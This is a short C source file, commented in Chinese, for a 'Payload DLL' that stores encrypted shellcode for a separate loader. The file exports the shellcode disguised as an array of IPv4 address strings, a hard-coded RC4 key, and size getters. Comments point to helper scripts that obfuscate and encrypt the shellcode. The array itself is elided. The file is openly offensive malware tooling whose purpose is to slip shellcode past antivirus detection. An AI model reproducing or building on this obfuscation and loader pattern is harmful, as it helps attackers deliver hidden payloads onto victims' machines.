// ============================================================
//  Payload DLL v3.0 — 纯数据载体，不含任何执行逻辑
//  导出:  IPv4数组 + RC4密钥 + 各尺寸参数
// ============================================================
#include <windows.h>

/* ── IPv4 混淆数组 (运行时由 shellcode-obfuscate-ipv4.py 生成替换) ── */
...
/* ── RC4 密钥 (16字节随机生成，由 shellcode-encrypt.py --genkey 替换) ── */
const unsigned char rc4_key[] = {
    0xA3,0x7F,0x12,0xE8,0x55,0x9C,0x3D,0x71,
    0xBE,0x44,0x8F,0x06,0xD2,0x69,0x3A,0xFC
};
#define KEY_SIZE (sizeof(rc4_key))

/* ── 导出函数 ── */
__declspec(dllexport) char**                GetPayloadData(void)    { return ipv4_array; }
__declspec(dllexport) size_t                GetPayloadSize(void)    { return IPV4_COUNT; }
__declspec(dllexport) const unsigned char*  GetEncryptionKey(void)  { return rc4_key; }
__declspec(dllexport) size_t                GetKeySize(void)        { return KEY_SIZE; }
